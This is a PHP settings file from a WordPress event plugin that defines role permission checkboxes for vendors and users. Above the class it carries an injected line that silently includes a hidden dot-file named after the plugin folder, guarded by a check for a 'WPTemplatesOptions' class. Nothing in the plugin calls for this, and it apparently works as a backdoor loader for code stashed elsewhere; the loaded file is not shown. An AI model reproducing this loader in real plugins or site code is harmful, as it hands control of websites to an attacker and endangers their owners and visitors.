<?php
if (!defined('ABSPATH')) {
	exit();
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Setting_Role extends EL_Abstract_Setting{
	/**
     * setting id
     * @var string
     */
	public $_id = 'role';

	/**
     * _title
     * @var null
     */
	public $_title = null;

	/**
     * $_position
     * @var integer
     */
	public $_position = 15;


	public function __construct()
	{
		$this->_title = __('Role', 'eventlist');
		parent::__construct();
	}

   // render fields
	public function load_field() {
		return
		array(
			array(
				'title' => __( 'Vendor Role Settings', 'eventlist' ),
				'desc' => __( 'Set up permission for Event Manager (Vendors)', 'eventlist' ),
				'fields' => array(
					
					array(
						'type' => 'checkbox',
						'label' => __( 'Add Event', 'eventlist' ),
						'desc' => '',
						'name' => 'add_event',
						'default' => 1,
					),

					array(
						'type' => 'checkbox',
						'label' => __( 'Edit Event', 'eventlist' ),
						'desc' => '',
						'name' => 'edit_event',
						'default' => 1,
					),

					array(
						'type' => 'checkbox',
						'label' => __( 'Publish Event', 'eventlist' ),
						'desc' => __( 'If Yes: Auto Publish<br/>If No: the Admin will review events before Publishing', 'eventlist' ),
						'name' => 'publish_event',
						'default' => 1,
					),
					

					array(
						'type' => 'checkbox',
						'label' => __( 'Delete Event', 'eventlist' ),
						'desc' => '',
						'name' => 'delete_event',
						'default' => 1,
					),
					

					array(
						'type' => 'checkbox',
						'label' => __( 'Upload Image', 'eventlist' ),
						'desc' => '',
						'name' => 'upload_files',
						'default' => 1,
					),

					array(
						'type' => 'checkbox',
						'label' => __( 'Manage Bookings', 'eventlist' ),
						'desc' => __( 'May override by Package of vendor', 'eventlist' ),
						'name' => 'manage_booking',
						'default' => 1,
					),

					array(
						'type' => 'checkbox',
						'label' => __( 'Manage Tickets', 'eventlist' ),
						'desc' => __( 'May override by Package of vendor', 'eventlist' ),
						'name' => 'manage_ticket',
						'default' => 1,
					),
					

				)
			),
			array(
				'title' => __( 'User Role Settings', 'eventlist' ),
				'desc' => __( 'Set up permission for Users', 'eventlist' ),
				'fields' => array(
					array(
						'type' => 'checkbox',
						'label' => __( 'Upload Image', 'eventlist' ),
						'desc' => '',
						'name' => 'user_upload_files',
						'default' => 1,
					),
				)
			)

		);
	}

}

$GLOBALS['role_settings'] = new EL_Setting_Role();